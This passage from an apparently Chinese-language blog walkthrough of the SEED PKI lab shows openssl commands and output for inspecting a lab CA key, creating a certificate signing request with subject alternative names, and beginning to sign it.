86:4f:34:03:29:53:a1:c0:4b:25:2f:b1:c8:4b:1a:<br>    33:d6:b8:24:ac:e3:d1:6e:6c:38:97:94:c6:e3:e5:<br>    a1:88:2c:2b:1a:db:eb:25:96:e8:82:c5:f9:97:d6:<br>    7c:de:c7:4f:96:2b:3b:8c:8f:b0:2e:66:8c:7b:b9:<br>    16:57:d2:cb:56:23:cb:08:e2:85:57:2c:90:40:3c:<br>    a3:34:37:fd:20:99:b9:34:a9:3b:5d:cb:b0:ef:a7:<br>    1b:55:78:8c:aa:48:51:3f:d9:ec:f8:d5:20:e4:ce:<br>    8f:92:d8:88:0d:ae:9b:27:37:7d:1f:8e:8f:50:37:<br>    d9:f2:14:aa:d9:18:32:3d:df:02:14:24:24:c8:d8:<br>    a6:4d<br>exponent2:<br>    00:c3:db:46:2b:42:9d:14:83:73:56:36:2b:17:0d:<br>    da:2b:4e:d7:54:43:ef:22:cd:8c:76:1b:54:6b:1e:<br>    f9:a0:4e:e6:63:4b:3a:dc:ca:da:f7:df:45:21:b2:<br>    c4:f7:a2:9b:ac:e3:b1:ac:75:be:47:8f:64:0c:3a:<br>    11:2b:c4:93:22:5a:57:6c:eb:27:8c:0e:6d:15:a4:<br>    25:99:22:c9:20:45:f4:5d:b0:d0:94:79:d1:36:6b:<br>    26:21:42:39:1e:d7:34:fc:96:f1:b0:fd:27:64:23:<br>    f2:27:c3:29:da:0f:a6:ad:36:92:c4:f5:c8:70:3d:<br>    85:e8:b4:2b:86:c2:5f:c0:2d:f3:77:1f:59:05:5e:<br>    e2:5f:b8:74:17:5f:23:ea:bb:5b:09:cd:58:29:02:<br>    b5:6a:34:7d:31:00:77:59:f2:4d:af:06:2d:c2:c3:<br>    d6:12:1b:71:ee:e7:75:21:0a:d1:33:40:cf:19:b0:<br>    a0:28:22:b2:86:a0:8a:ce:71:aa:7b:d7:93:f7:53:<br>    64:58:f1:c7:81:af:54:8d:27:62:7d:af:bc:c5:05:<br>    e7:6a:d6:2f:00:86:74:b1:11:b7:fe:0c:22:31:f6:<br>    07:c2:6d:b9:35:eb:4c:c4:29:f8:74:cb:ac:b9:a9:<br>    da:92:2e:67:19:e3:a2:50:09:77:46:ae:60:0a:19:<br>    23:2f<br>coefficient:<br>    18:01:82:8e:84:28:56:0f:0a:ce:25:4c:06:70:53:<br>    3c:ea:55:b3:13:f4:e3:73:21:b0:5d:e5:e4:81:1d:<br>    09:e2:c8:fe:f8:b1:54:75:a0:79:d7:d6:df:2f:86:<br>    98:f0:c7:2d:38:aa:e9:a8:8a:8b:cf:ad:60:bf:b7:<br>    5e:d7:18:96:be:d6:00:cd:8d:06:62:a0:ec:50:1e:<br>    25:26:44:14:33:b5:28:4a:4e:3b:61:c7:86:05:17:<br>    4c:a4:07:70:88:f0:ee:07:79:c1:0a:5e:a8:3c:4d:<br>    41:4b:8b:98:26:d8:7f:12:75:e2:7c:d8:12:97:c6:<br>    22:d6:e1:39:ec:c7:0a:72:17:ca:6e:75:69:b7:79:<br>    4f:ad:65:1b:8b:b6:5d:c3:65:d3:6b:44:9c:cd:37:<br>    c5:79:c4:a8:6f:75:56:b4:92:c9:db:2b:1f:6a:b5:<br>    34:d8:68:6f:cc:c5:b6:96:6b:30:2c:fa:da:34:26:<br>    62:d3:9c:ee:76:e2:f4:2c:ac:c0:33:76:11:01:cc:<br>    10:c9:d3:af:5c:39:03:2a:66:ca:cc:4a:37:63:05:<br>    e6:45:9a:7e:9e:61:b4:b3:9d:90:2b:a4:fa:ef:f1:<br>    64:aa:f0:8a:de:f6:4c:ca:e8:82:29:02:6a:d5:1b:<br>    d3:5e:95:1a:5c:40:0b:03:1a:3e:12:a4:ea:82:9a:<br>    18<br><br></code></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q:"></a>Q:</h2><p>What part of the certificate indicates this is a CA’s certificate? </p><p>在证书中，判断是否为CA证书可以查看”Basic Constraints”扩展字段。在这个证书中，存在并标记为关键的”X509v3 Basic Constraints”扩展字段。其取值为”CA:TRUE”，表示这是一张CA证书。该扩展字段用于识别证书是否具有签发其他证书的权限。</p><p>What part of the certificate indicates this is a self-signed certificate? </p><p>要判断证书是否为自签名证书，可以比较主题字段和颁发者字段。在这个证书中，主题和颁发者字段相同：”CN = <a href="http://www.modelca.com/">www.modelCA.com</a>, O = Model CA LTD., C = US”。当主题和颁发者字段相同的时候，表明证书是自签名的。</p><p>In the RSA algorithm, we have a public exponent e, a private exponent d , a modulus n , and two secret numbers p  and q , such that n = p * q . Please identify the values for these elements in your certificate and key files.</p><ul><li>modulus：模数，由两个素数相乘得到</li><li>publicExponent：公开指数，表示用于加密的公钥指数，这里是65537。</li><li>privateExponent：私有指数，表示用于解密的私钥指数。</li><li>prime1和prime2：两个素数，用于生成模数。</li></ul><h1 id="Task-2-Generating-a-Certificate-Request-for-Your-Web-Server"><a href="#Task-2-Generating-a-Certificate-Request-for-Your-Web-Server" class="headerlink" title="Task 2: Generating a Certificate Request for Your Web Server"></a>Task 2: Generating a Certificate Request for Your Web Server</h1><p>一个名为bank32.com（请将其替换为您自己的Web服务器名称）的公司希望从我们的CA获取公钥证书。首先，它需要生成一个证书签名请求（CSR），其中包括公司的公钥和身份信息。CSR将被发送给CA，CA将验证请求中的身份信息，然后生成一个证书。 生成CSR的命令与我们用于创建CA的自签名证书的命令非常相似，唯一的区别是使用了”-x509”选项。没有该选项，该命令将生成一个请求；而使用该选项，该命令将生成一个自签名证书。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haml">openssl req -newkey rsa:2048 -sha256 \<br>-<span class="ruby">keyout server.key -out server.csr \</span><br><span class="ruby"></span>-<span class="ruby">subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=gls23 Inc./C=US&quot;</span> \</span><br><span class="ruby"></span>-<span class="ruby">passout <span class="hljs-symbol">pass:</span>dees</span><br></code></pre></td></tr></table></figure><ul><li><code>req</code>：指定使用 OpenSSL 的 req 命令。</li><li><code>-newkey rsa:2048</code>：生成一个新的 RSA 密钥对，密钥长度为 2048 位。</li><li><code>-sha256</code>：使用 SHA-256 算法进行摘要计算。</li><li><code>-keyout server.key</code>：将生成的私钥保存到名为 server.key 的文件中。</li><li><code>-out server.csr</code>：将生成的 CSR 保存到名为 server.csr 的文件中。</li><li><code>-subj &quot;/CN=www.chenyang2022.com/O=Chenyang2022 Inc./C=US&quot;</code>：设置 CSR 的主题信息，包括常用名称 (Common Name)、组织名称 (Organization) 和国家/地区 (Country)。</li><li><code>-passout pass:dees</code>：设置私钥文件的加密密码为 “dees”。</li></ul><h2 id="Adding-Alternative-names"><a href="#Adding-Alternative-names" class="headerlink" title="Adding Alternative names"></a>Adding Alternative names</h2><p>浏览器实施的主机名匹配策略要求证书中的通用名称必须与服务器的主机名匹配，否则浏览器将拒绝与服务器通信。为了允许一个证书具有多个名称，X.509 规范定义了附加到证书上的扩展。这个扩展称为主体备用名称（Subject Alternative Name，SAN）。使用 SAN 扩展，可以在证书的 subjectAltName 字段中指定多个主机名。为了生成带有这样一个字段的证书签名请求，我们可以将所有必要的信息放在一个配置文件中或者通过命令行提供。在这个任务中，我们将使用命令行方法（配置文件方法在另一个 SEED 实验室，即 TLS 实验室中使用）。我们可以向 “openssl req” 命令添加以下选项。需要注意的是，subjectAltName 扩展字段还必须包括来自通用名称字段的内容；否则，通用名称将不被接受为有效名称。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">openssl req -newkey rs<span class="hljs-variable">a:2048</span> -<span class="hljs-built_in">sha256</span> \<br>-keyout server.key -out server.csr \<br>-subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=gls23 Inc./C=US&quot;</span> \<br>-passout pas<span class="hljs-variable">s:dees</span> \<br>-addext <span class="hljs-comment">&quot;subjectAltName = DNS:www.gls2023.com, \</span><br>DNS:www.gls2024.<span class="hljs-keyword">com</span><span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[06/21/23]</span>seed<span class="hljs-keyword">@VM</span>:~/demoCA$ openssl req -newkey <span class="hljs-attribute">rsa</span>:<span class="hljs-number">2048</span> -sha256 \<br>&gt; -keyout server.key -out server.csr \<br>&gt; -subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=Bank32 Inc./C=US&quot;</span> \<br>&gt; -passout <span class="hljs-attribute">pass</span>:dees \<br>&gt; -addext <span class="hljs-string">&quot;subjectAltName = DNS:www.gls2023.com, \</span><br><span class="hljs-string">&gt; DNS:www.gls2024.com&quot;</span><br>Generating a RSA private key<br>...................+++++<br>..........................................................................................................................+++++<br>writing new private key to <span class="hljs-string">&#x27;server.key&#x27;</span><br><br>[<span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-keyword">@VM</span>:~/demoCA$ openssl req -in server.csr -text -noout<br>Certificate <span class="hljs-attribute">Request</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">1</span> (<span class="hljs-number">0</span>x0)<br>        <span class="hljs-attribute">Subject</span>: CN = www.gls23.com, O = Bank32 Inc., C = US<br>        Subject Public Key <span class="hljs-attribute">Info</span>:<br>            Public Key <span class="hljs-attribute">Algorithm</span>: rsaEncryption<br>                RSA <span class="hljs-attribute">Public-Key</span>: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-number">00</span>:a4:<span class="hljs-number">10</span>:d3:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">98</span>:<span class="hljs-number">01</span>:<span class="hljs-number">14</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:c1:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">ba</span>:<br>                    <span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">64</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:e2:<span class="hljs-number">35</span>:<span class="hljs-number">27</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">03</span>:c5:c4:f0:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">53</span>:<br>                    f0:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">11</span>:<span class="hljs-number">40</span>:e6:<span class="hljs-attribute">ab</span>:<span class="hljs-attribute">df</span>:e1:<span class="hljs-number">56</span>:d5:a7:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">56</span>:<span class="hljs-number">25</span>:a8:<br>                    <span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">79</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e7:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">98</span>:a9:<span class="hljs-number">96</span>:<span class="hljs-number">26</span>:e0:e2:c5:<span class="hljs-number">93</span>:<br>                    <span class="hljs-attribute">ec</span>:d9:b8:<span class="hljs-attribute">cc</span>:<span class="hljs-number">53</span>:<span class="hljs-number">46</span>:e7:<span class="hljs-number">13</span>:<span class="hljs-number">79</span>:<span class="hljs-number">27</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-attribute">be</span>:<span class="hljs-number">33</span>:b0:d1:<br>                    d0:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:b6:<span class="hljs-number">59</span>:<span class="hljs-number">91</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<span class="hljs-number">48</span>:d8:a8:<span class="hljs-number">66</span>:<span class="hljs-number">57</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:a1:<span class="hljs-attribute">be</span>:<br>                    <span class="hljs-number">82</span>:<span class="hljs-number">61</span>:<span class="hljs-attribute">bb</span>:b5:c4:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">78</span>:d5:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:<span class="hljs-number">56</span>:<span class="hljs-number">51</span>:<span class="hljs-number">43</span>:<span class="hljs-number">78</span>:<span class="hljs-number">95</span>:<br>                    <span class="hljs-number">83</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">91</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">66</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:d4:<span class="hljs-number">26</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">97</span>:<span class="hljs-number">46</span>:e7:<br>                    <span class="hljs-number">57</span>:<span class="hljs-number">03</span>:<span class="hljs-number">10</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">45</span>:<span class="hljs-attribute">bd</span>:b7:<span class="hljs-number">96</span>:<span class="hljs-number">23</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">be</span>:<span class="hljs-number">14</span>:<span class="hljs-number">57</span>:<span class="hljs-number">84</span>:<br>                    c5:<span class="hljs-number">52</span>:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">06</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">55</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">19</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">26</span>:b2:<span class="hljs-attribute">fe</span>:<br>                    <span class="hljs-number">00</span>:<span class="hljs-number">45</span>:e0:<span class="hljs-number">02</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:a5:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">80</span>:<span class="hljs-attribute">df</span>:<span class="hljs-number">73</span>:<span class="hljs-number">55</span>:<span class="hljs-number">65</span>:<span class="hljs-number">84</span>:<span class="hljs-number">28</span>:<br>                    <span class="hljs-number">63</span>:<span class="hljs-number">93</span>:d1:<span class="hljs-number">00</span>:<span class="hljs-number">80</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">52</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:b5:<span class="hljs-number">24</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:e9:a0:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">20</span>:<br>                    <span class="hljs-number">43</span>:<span class="hljs-number">55</span>:e2:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">03</span>:<span class="hljs-number">02</span>:<span class="hljs-number">82</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-number">72</span>:<span class="hljs-number">54</span>:<span class="hljs-number">97</span>:<span class="hljs-number">83</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<br>                    <span class="hljs-number">8</span><span class="hljs-attribute">b</span>:b5:f9:b8:<span class="hljs-number">41</span>:<span class="hljs-number">11</span>:d7:b9:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">51</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-number">73</span>:<br>                    <span class="hljs-number">18</span>:e4:<span class="hljs-number">48</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:c1:<span class="hljs-number">54</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:d0:a0:e7:<span class="hljs-attribute">dc</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">57</span>:<span class="hljs-attribute">fd</span>:<br>                    <span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">48</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:b2:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">74</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">68</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">b</span>:<span class="hljs-number">3</span><span class="hljs-attribute">b</span>:<span class="hljs-number">97</span>:<span class="hljs-attribute">ec</span>:<span class="hljs-attribute">bf</span>:<br>                    <span class="hljs-number">12</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">36</span>:<span class="hljs-number">63</span>:<span class="hljs-number">50</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:e8:<span class="hljs-number">31</span>:<span class="hljs-number">02</span>:d8:e5:d1:e5:<br>                    <span class="hljs-number">2</span><span class="hljs-attribute">f</span>:ed<br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        <span class="hljs-attribute">Attributes</span>:<br>        Requested <span class="hljs-attribute">Extensions</span>:<br>            X509v3 Subject Alternative <span class="hljs-attribute">Name</span>: <br>                <span class="hljs-attribute">DNS</span>:www.gls2023.com, <span class="hljs-attribute">DNS</span>:www.gls2024.com<br>    Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>         <span class="hljs-number">4</span><span class="hljs-attribute">c</span>:f5:d9:b2:f7:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">19</span>:f1:<span class="hljs-number">57</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">57</span>:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:d6:a9:<span class="hljs-number">89</span>:<span class="hljs-attribute">ad</span>:<br>         <span class="hljs-attribute">cb</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">37</span>:c5:<span class="hljs-number">44</span>:<span class="hljs-number">00</span>:c2:<span class="hljs-number">31</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">64</span>:a8:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">51</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">04</span>:d0:<br>         b0:<span class="hljs-number">07</span>:c9:c8:f6:<span class="hljs-attribute">fc</span>:<span class="hljs-number">56</span>:<span class="hljs-attribute">ba</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:c7:b2:<span class="hljs-attribute">bb</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">98</span>:<span class="hljs-number">15</span>:e8:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:d5:<span class="hljs-number">32</span>:<span class="hljs-number">41</span>:<span class="hljs-number">69</span>:d5:<span class="hljs-number">83</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">c</span>:<span class="hljs-number">68</span>:<span class="hljs-attribute">bd</span>:c1:<span class="hljs-number">22</span>:<span class="hljs-number">35</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<br>         <span class="hljs-attribute">fa</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">71</span>:<span class="hljs-number">22</span>:c1:<span class="hljs-number">71</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">13</span>:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:d4:<span class="hljs-attribute">bb</span>:d5:b4:d2:<span class="hljs-attribute">eb</span>:<br>         <span class="hljs-attribute">be</span>:e7:<span class="hljs-number">53</span>:c4:<span class="hljs-number">50</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">77</span>:<span class="hljs-number">00</span>:<span class="hljs-number">23</span>:<span class="hljs-number">14</span>:<span class="hljs-number">86</span>:a6:<span class="hljs-number">98</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-number">80</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:b7:<br>         <span class="hljs-number">51</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:f1:<span class="hljs-number">81</span>:<span class="hljs-number">48</span>:e5:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">dc</span>:f2:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:b7:a4:<span class="hljs-number">43</span>:a3:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-attribute">bf</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">66</span>:<span class="hljs-number">59</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">12</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">23</span>:c0:a1:<span class="hljs-attribute">da</span>:<span class="hljs-number">38</span>:<span class="hljs-attribute">ff</span>:c1:e8:<span class="hljs-number">78</span>:<span class="hljs-attribute">cd</span>:b5:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">43</span>:e8:<span class="hljs-number">82</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:d3:<span class="hljs-number">76</span>:a9:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:e2:<span class="hljs-number">54</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-number">85</span>:<span class="hljs-number">66</span>:<span class="hljs-number">18</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">19</span>:<span class="hljs-attribute">bd</span>:c4:<br>         <span class="hljs-number">5</span><span class="hljs-attribute">b</span>:f7:f2:<span class="hljs-number">53</span>:<span class="hljs-number">13</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">44</span>:<span class="hljs-number">73</span>:<span class="hljs-attribute">be</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">20</span>:<span class="hljs-number">18</span>:b2:<span class="hljs-number">65</span>:<span class="hljs-number">96</span>:<br>         <span class="hljs-number">24</span>:<span class="hljs-number">22</span>:<span class="hljs-number">43</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">11</span>:<span class="hljs-number">62</span>:<span class="hljs-number">18</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:b6:<span class="hljs-number">47</span>:e1:f2:<span class="hljs-number">70</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">95</span>:<br>         <span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">aa</span>:d5:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:d9:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">83</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:d0:<span class="hljs-attribute">bd</span>:<span class="hljs-attribute">ae</span>:b4:<span class="hljs-number">76</span>:a3:a8:a6:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">94</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:e7:<span class="hljs-attribute">fe</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">06</span>:<span class="hljs-number">67</span>:<span class="hljs-number">10</span>:<span class="hljs-number">60</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span>:<br>         c1:<span class="hljs-number">78</span>:c7:<span class="hljs-number">65</span>:f3:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">52</span>:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">02</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:f8:<span class="hljs-number">98</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-number">05</span>:<span class="hljs-number">58</span>:<span class="hljs-number">73</span>:b0:c0:<br>         <span class="hljs-number">56</span>:<span class="hljs-number">82</span>:<span class="hljs-number">52</span>:<span class="hljs-number">34</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-3-Generating-a-Certificate-for-your-server"><a href="#Task-3-Generating-a-Certificate-for-your-server" class="headerlink" title="Task 3: Generating a Certificate for your server"></a>Task 3: Generating a Certificate for your server</h1><p>CSR 文件需要有 CA 的签名才能形成证书。在现实世界中，CSR 文件通常被发送到受信任的 CA 以获得签名。在这个lab中，我们将使用我们自己的可信 CA 来生成证书。下面的命令使用 CA 的 CA.crt 和 CA.key 将证书签名请求(server.csr)转换为 X509证书(server.crt) :</p><p>注意我的配置文件在./my_openssl.cnf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/CA$ openssl ca -config ./my_openssl.cnf -policy policy_anything \<br><span class="hljs-meta">&gt;</span><span class="bash"> -md sha256 -days 3650 \</span><br><span class="bash">&gt; -<span 